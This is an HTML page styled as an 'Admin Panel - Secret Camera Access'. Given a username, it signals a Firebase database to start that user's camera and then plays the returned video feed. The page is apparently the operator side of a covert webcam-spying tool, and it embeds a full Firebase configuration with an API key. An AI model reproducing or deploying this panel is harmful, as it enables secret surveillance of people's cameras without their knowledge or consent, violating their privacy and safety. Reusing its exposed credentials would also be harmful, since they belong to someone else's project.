<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Secret Camera Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    video {
      width: 70%;
      height: auto;
      margin-top: 20px;
    }
  </style>
  <!-- Firebase Configuration (Firebase v8) -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>
  <h1>Admin Panel - Secret Camera Access</h1>
  
  <input type="text" id="userIdInput" placeholder="Enter Username">
  <button id="requestCamera">Request Camera Access</button>

  <video id="adminVideo" autoplay playsinline></video>

  <script>
    // Firebase Configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCUUabZ_pDb0C1dezzuyBVzP6Ut7XpWo0s",
      authDomain: "form-e74ab.firebaseapp.com",
      databaseURL: "https://form-e74ab-default-rtdb.firebaseio.com",
      projectId: "form-e74ab",
      storageBucket: "form-e74ab.appspot.com",
      messagingSenderId: "93811294360",
      appId: "1:93811294360:web:6bfcd40b7a4fe2524cd0ed",
      measurementId: "G-GV55PBD71V"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const adminVideo = document.getElementById('adminVideo');

    // Request camera access for a specific user
    document.getElementById('requestCamera').addEventListener('click', () => {
      const userId = document.getElementById('userIdInput').value.trim();

      if (userId) {
        // Send camera request to Firebase
        db.ref(`cameraRequests/${userId}`).set({ active: true });

        // Start listening for the camera feed
        db.ref(`cameraFeeds/${userId}`).on('value', (snapshot) => {
          const feedData = snapshot.val();
          if (feedData && feedData.blob) {
            const videoBlob = new Blob([feedData.blob], { type: 'video/webm' });
            const videoUrl = URL.createObjectURL(videoBlob);
            adminVideo.src = videoUrl;
          }
        });
      } else {
        alert("Please enter a valid username.");
      }
    });
  </script>
</body>
</html>
